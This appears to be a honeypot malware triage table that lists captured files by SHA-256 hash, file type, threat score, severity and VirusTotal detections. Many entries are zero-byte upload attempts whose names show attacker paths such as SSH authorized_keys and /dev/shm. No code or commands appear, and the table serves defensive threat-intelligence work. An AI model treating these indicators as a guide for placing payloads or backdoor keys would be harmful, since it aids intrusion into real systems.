| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0de787cffbec4dcc42e0ecd9491795c7dfe8fe4a955cb67a87544d5c36070982` | ELF Binary (Linux executable) (x86-64 64-bit) | `0de787cffbec4dcc...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `187b67e5e2116293144f4009b1f224ed09eea924dd4ade00741a66792a63b45a` | ELF Binary (Linux executable) (x86-64 64-bit) | `187b67e5e2116293...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `19e78c00d07f011fcb708ffb12f8dd2fd0f1e57faaf21129b53c7f68ae611e60` | ELF Binary (Linux executable) (x86-64 64-bit) | `19e78c00d07f011f...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ec20680994f17b88492809aa5d135fb463c04ec5868639c5515126e2149a240` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ec20680994f17b8...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `1ff7c192f591fe63fae453eb8a91da94b276376d3880e3078c3c5a20ba6b45ab` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ff7c192f591fe63...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260829-070814-1e3fd1472a75-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260829-070814-1e3fd1472a75-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260829-070814-1e3fd1472a75-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260829-070814-1e3fd1472a75-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260913-011104-f5ed7ce067ce-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260913-011104-f5ed7ce067ce-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260913-011104-f5ed7ce067ce-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260913-011104-f5ed7ce067ce-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260920-003037-b88cc1613267-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260920-003037-b88cc1613267-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260920-003037-b88cc1613267-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260920-003037-b88cc1613267-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260927-145506-d03196a77e63-1-redir__home_agent__ssh_authorized_keys` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `20261008-145415-23c1b0a0025f-1-redir__root__ssh_authorized_keys` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `20261009-093904-ac680d88c8d9-0-redir__tmp_lmaoxx` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261009-095945-4c9839647ec3-0-redir__tmp_lmaoxx` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261009-100311-4d516f02cba6-0-redir__tmp_lmaoxx` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261019-185426-081336a62cf7-1-redir__home_rita__ssh_authorized_keys` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `20261019-225429-8362bcca82fc-1-redir__home_frontend__ssh_authorized_keys` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `20261025-185437_sftp__root__5233262310663267715_sshd` | ELF Binary (Linux executable) (x86-64 64-bit) | `d16bffbd3ba31504...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `20261104-221051-7938b165b97e-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261104-221051-7938b165b97e-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261104-221051-7938b165b97e-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261104-221051-7938b165b97e-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261105-105425_sftp__root__16` | ELF Binary (Linux executable) (x86-64 64-bit) | `0de787cffbec4dcc...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `20261106-175451-3c25612f55b3-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261106-175451-3c25612f55b3-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261106-175451-3c25612f55b3-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261106-175451-3c25612f55b3-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261107-105429_sftp__root__16` | ELF Binary (Linux executable) (x86-64 64-bit) | `f609b7d911ffd85f...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `20261108-005209_sftp__dev_shm__16` | ELF Binary (Linux executable) (x86-64 64-bit) | `8e9db283c40447a6...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `20261109-005416_sftp__dev_shm__16` | ELF Binary (Linux executable) (x86-64 64-bit) | `fdc54d0e4bf1fa52...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `20261109-040344-27e7ba64863a-0-redir__dev__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-040344-27e7ba64863a-0-redir__dev_shm__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-040344-27e7ba64863a-0-redir__etc__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-040344-27e7ba64863a-0-redir__mnt__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-040344-27e7ba64863a-0-redir__tmp__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-040344-27e7ba64863a-0-redir__var__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-040344-27e7ba64863a-0-redir__var_run__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-040344-27e7ba64863a-0-redir__var_tmp__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-040345-27e7ba64863a-0-redir__boot__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-040345-27e7ba64863a-0-redir__home__k` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-040345-27e7ba64863a-0-redir__usr__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-040346-27e7ba64863a-0-redir__home__d` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-165619-51c0c30a4d88-0-redir__mnt_main_arm7` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-165646-51c0c30a4d88-0-redir__mnt_7` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-201346-4825ad25369c-0-redir__boot__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-201346-4825ad25369c-0-redir__dev__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-201346-4825ad25369c-0-redir__dev_shm__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-201346-4825ad25369c-0-redir__etc__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-201346-4825ad25369c-0-redir__home__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-201346-4825ad25369c-0-redir__home__k` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-201346-4825ad25369c-0-redir__mnt__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-201346-4825ad25369c-0-redir__tmp__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-201346-4825ad25369c-0-redir__usr__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-201346-4825ad25369c-0-redir__var__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-201346-4825ad25369c-0-redir__var_run__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-201346-4825ad25369c-0-redir__var_tmp__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-203632-372bc8ada403-0-redir__boot__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-203632-372bc8ada403-0-redir__dev__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-203632-372bc8ada403-0-redir__dev_shm__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-203632-372bc8ada403-0-redir__etc__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-203632-372bc8ada403-0-redir__home__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-203632-372bc8ada403-0-redir__home__k` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-203632-372bc8ada403-0-redir__mnt__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20261109-203632-372bc8ada403-0-redir__tmp__b` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
